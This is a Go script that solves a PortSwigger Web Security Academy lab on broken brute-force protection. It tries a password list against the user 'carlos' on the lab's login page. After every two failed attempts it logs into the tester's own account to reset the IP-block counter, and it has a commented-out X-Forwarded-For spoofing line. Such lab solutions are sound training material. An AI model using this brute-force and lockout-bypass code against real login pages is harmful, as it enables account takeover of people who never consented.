// https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	//"net/http/httputil"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

const myUsername = "wiener"
const myPassword = "peter"
const targetUsername = "carlos"

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a5d00d003d52684c0caaa2900fe00b6.web-security-academy.net"
	loginUrl := u + "/login"

	password, err := password(loginUrl, client)
	if err != nil {
		return err
	}

	fmt.Println("Username:", targetUsername)
	fmt.Println("Password:", password)
	return nil
}

func password(u string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	failed := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()

		if failed == 2 {
			_, _, err = login(u, myUsername, myPassword, client)
			if err != nil {
				return "", err
			}
			failed = 0
		}

		ok, body, err := login(u, targetUsername, password, client)
		if err != nil {
			return "", err
		}
		if ok {
			return password, nil
		}
		if strings.Contains(body, "Incorrect password") {
			failed += 1
		}
	}
	return "", fmt.Errorf("password not found")
}

func login(u, username, password string, client *http.Client) (bool, string, error) {
	fmt.Println("Login", username, password)
	postData := url.Values{"username": {username}, "password": {password}}
	req, err := http.NewRequest("POST", u, strings.NewReader(postData.Encode()))
	if err != nil {
		return false, "", err
	}
	//req.Header.Add("X-Forwarded-For", randIP())

	//dump, err := httputil.DumpRequestOut(req, true)
	//if err != nil {
	//	return false, "", err
	//}
	//fmt.Printf("%q", dump)

	resp, err := client.Do(req)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	//fmt.Println(resp.Status)
	//fmt.Println(resp.Header)

	if resp.StatusCode/100 != 2 && resp.StatusCode/100 != 3 {
		return false, "", fmt.Errorf("%v", resp.Status)
	}

	if resp.StatusCode/100 == 3 {
		return true, "", nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, "", err
	}
	b := string(body)

	if strings.Contains(b, "Your username") {
		return true, "", nil
	}
	//fmt.Println(b)
	return false, b, nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randString(n int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func randIP() string {
	rand.Seed(time.Now().UnixNano())
	b := &strings.Builder{}
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	return b.String()
}
